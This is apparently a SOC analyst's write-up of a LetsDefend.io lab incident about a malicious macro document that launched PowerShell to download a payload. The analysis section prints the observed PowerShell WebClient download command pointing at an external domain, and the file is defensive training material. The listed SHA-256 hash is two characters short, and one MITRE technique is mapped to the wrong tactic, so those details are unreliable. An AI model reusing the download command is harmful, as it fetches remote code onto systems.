#  Incident 10 – Malicious Macro Execution Detected (SOC205)

**Platform:** LetsDefend.io  
**Incident ID:** 231  
**Rule Name:** SOC205 – Malicious Macro has been executed  
**Severity:** Medium  
**Type:** Malware  
**Status:** Closed – True Positive  

---

## 1. Incident Overview

A **SOC205 alert** was triggered after a **malicious macro-enabled document** was executed on an internal endpoint.  
The file was delivered as a fake invoice document and contained **embedded VBA macros** that executed **PowerShell commands** to download additional payloads from an external domain.

The activity indicates a **malware delivery attempt via document-based social engineering**.

![Alert Overview](Screenshots/01_alert_overview.png)

---

## 2. Alert Metadata

- **Event ID:** 231  
- **Event Time:** Feb 28, 2024 – 08:42 AM  
- **Date Closed:** Dec 24, 2025 – 12:58 PM  
- **Rule Level:** Security Analyst  
- **Hostname:** Jayne  
- **IP Address:** 172.16.17.198  
- **File Name:** edit1-invoice.docm  
- **File Path:** `C:\Users\LetsDefend\Downloads\edit1-invoice.docm`  
- **AV/EDR Action:** Detected  


## 3. File & Hash Analysis

### File Hash (SHA-256)
```
1a819d18c9a9de4f81829c4cd55a17f76443c22f9b30ca95386827e5d96fb0
```

### VirusTotal Result
- **Detection Ratio:** 34 / 66 vendors  
- **File Type:** Microsoft Word Macro-enabled Document  
- **Threat Labels:** Trojan Downloader, VBA Macro Malware, PowerShell Loader  

![VirusTotal File Analysis](Screenshots/03_virustotal_file.png)

---

## 4. Macro & PowerShell Execution Analysis

### Observed Behavior
- Malicious VBA macro executed on document open
- PowerShell spawned using `powershell.exe`
- Payload downloaded using `System.Net.WebClient`
- External domain contacted

### PowerShell Command
```
powershell.exe (New-Object System.Net.WebClient).DownloadFile(
"http://www.greyhathacker.net/...","payload.exe"
)
```

![PowerShell Execution Log](Screenshots/04_powershell_execution.png)

---

## 5. Endpoint Telemetry Analysis

- **Event ID:** 4688 – New Process Created  
- **Process:** powershell.exe  
- **Parent:** explorer.exe  
- **User:** LetsDefend  

![Process Creation Event](Screenshots/05_process_creation.png)

---

## 6. Network & DNS Analysis

- **Domain:** www.greyhathacker.net  
- **Resolved IP:** 92.204.221.16  
- **Process:** powershell.exe  

![DNS Query Log](Screenshots/06_dns_query.png)

---

## 7. Indicators of Compromise (IOCs)

### File Hash
- 1a819d18c9a9de4f81829c4cd55a17f76443c22f9b30ca95386827e5d96fb0

### Domain
- www.greyhathacker.net

### Process
- powershell.exe

---

## 8. MITRE ATT&CK Mapping

| Tactic | Technique |
|------|-----------|
| Initial Access | T1566.001 – Phishing Attachment |
| Execution | T1059.001 – PowerShell |
| Defense Evasion | T1204.002 – Malicious File |
| C2 | T1071.001 – Web Protocols |

---

## 9. Response & Remediation

- Host isolated  
- Malicious document removed  
- PowerShell restricted  
- Indicators blocked  
- Email deleted  

---

## 10. Final Verdict

- **True Positive**
- Macro-based malware execution confirmed
- Contained successfully

![Case Closure](Screenshots/07_case_closure.png)

---

## 11. Analyst Notes

This case highlights the continued risk of **macro-enabled documents**.  
Restricting macros and PowerShell remains critical.